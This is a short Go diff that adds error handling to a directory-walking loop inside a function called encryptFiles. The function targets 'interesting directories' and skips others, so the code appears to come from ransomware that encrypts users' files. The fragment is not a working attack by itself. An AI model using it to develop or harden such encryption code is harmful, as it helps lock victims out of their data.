@@ -116,6 +116,11 @@ func encryptFiles() {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
+				if err != nil {
+					cmd.Logger.Println(err)
+					return err
+				}
+
 				if utils.StringInSlice(filepath.Base(path), cmd.SkippedDirs) {
 					cmd.Logger.Printf("Skipping dir %s", path)
 					return filepath.SkipDir
